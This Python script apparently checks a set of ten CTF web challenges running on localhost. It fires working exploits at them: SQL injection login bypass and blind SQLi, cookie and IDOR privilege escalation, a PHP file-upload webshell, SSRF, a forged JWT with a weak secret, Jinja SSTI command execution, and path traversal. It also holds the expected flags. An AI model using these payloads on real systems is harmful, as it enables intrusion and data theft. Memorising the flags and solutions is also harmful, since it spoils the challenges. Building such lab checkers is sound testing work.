#!/usr/bin/env python3
import urllib.request,urllib.parse,urllib.error,http.cookiejar,json,base64,hmac,hashlib,sys,time
BASE='http://127.0.0.1:'
def client(port):
 opener=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
 def ask(path='/',data=None,headers=None):
  body=None if data is None else urllib.parse.urlencode(data).encode()
  req=urllib.request.Request(BASE+str(port)+path,data=body,headers=headers or {})
  try:
   with opener.open(req,timeout=8) as r:return r.status,r.read().decode(errors='replace')
  except urllib.error.HTTPError as e:return e.code,e.read().decode(errors='replace')
 return ask

def run():
 checks=[]
 def check(n,ok,detail=''):
  checks.append(ok);print(f'web{n:02d}: '+('PASS' if ok else 'FAIL')+((' '+detail) if detail and not ok else ''))
 a=client(8001);a('/login',{'login':"admin' -- ",'password':'x'});check(1,'SPKctf{sql_byp4ss_succ3ss}' in a('/dashboard')[1])
 a=client(8002);a('/',{'login':'student','password':'student123'});check(2,a('/admin')[0]==403 and 'SPKctf{c00ki3_jar_4dmin}' in client(8002)('/admin',headers={'Cookie':'user_id=1'})[1])
 a=client(8003);check(3,a('/report',{'body':'<b>test</b>'})[0]==200 and '<b>test</b>' in a('/view?body=%3Cb%3Etest%3C%2Fb%3E')[1]);print('       XSS bot requires manual end-to-end callback check')
 a=client(8004);a('/login',{'login':'student','password':'student123'});check(4,'SPKctf{id0r_v3rtic4l_priv4sc}' in a('/profile?id=1')[1])
 # Multipart upload, then request the PHP file as a player would
 a=client(8005)
 payload=b'<?php echo file_get_contents("/flag.txt"); ?>'
 boundary='----SPKCTFTESTBOUNDARY'
 body=(('--'+boundary+'\r\nContent-Disposition: form-data; name="avatar"; filename="ctf_probe.php"\r\nContent-Type: image/png\r\n\r\n').encode()+payload+('\r\n--'+boundary+'--\r\n').encode())
 try:
  with urllib.request.urlopen(urllib.request.Request(BASE+'8005/',data=body,headers={'Content-Type':'multipart/form-data; boundary='+boundary}),timeout=8) as resp: uploaded=resp.read().decode()
  check(5,'Uploaded' in uploaded and 'SPKctf{unr3stricted_f1le_uplo4d}' in a('/uploads/ctf_probe.php')[1])
 except Exception as e:check(5,False,str(e))
 a=client(8006);check(6,'SPKctf{ssrf_internal_access}' in a('/fetch?url=http%3A%2F%2Finternal%3A9000%2Fflag')[1])
 a=client(8007);check(7,'найдено' in a('/search?q='+urllib.parse.quote("test' AND (SELECT substr(flag,1,1) FROM secret)='S' -- "))[1] and 'пусто' in a('/search?q='+urllib.parse.quote("test' AND (SELECT substr(flag,1,1) FROM secret)='X' -- "))[1])
 a=client(8008);_,body=a('/',{'login':'student','password':'student123'});tok=json.loads(body)['token'];head=base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip('=');pay=base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip('=');signed=head+'.'+pay;sig=base64.urlsafe_b64encode(hmac.new(b'spk2024',signed.encode(),hashlib.sha256).digest()).decode().rstrip('=');check(8,'SPKctf{jwt_w34k_s3cr3t_cracked}' in a('/admin',headers={'Authorization':'Bearer '+signed+'.'+sig})[1])
 a=client(8009);check(9,'49' in a('/hello?name=%7B%7B7%2A7%7D%7D')[1] and 'SPKctf{ssti_rce_achieved}' in a('/hello?name='+urllib.parse.quote("{{lipsum.__globals__['os'].popen('cat flag.txt').read()}}"))[1])
 a=client(8010);a('/login',{'login':'user','password':'user123'});_,notes=a('/notes?id=1');tok=json.loads(notes)['note'].split()[-1];_,report=a('/fetch?url='+urllib.parse.quote('http://reports:9010/internal?token='+tok));check(10,'reports/2024/dir.pdf' in report and 'SPKctf{full_ch4in_c0mpr0mise}' in a('/download?file='+urllib.parse.quote('....//secret/director_flag.txt'))[1])
 print('RESULT',sum(checks),'/',len(checks));return all(checks)
if __name__=='__main__':sys.exit(0 if run() else 1)
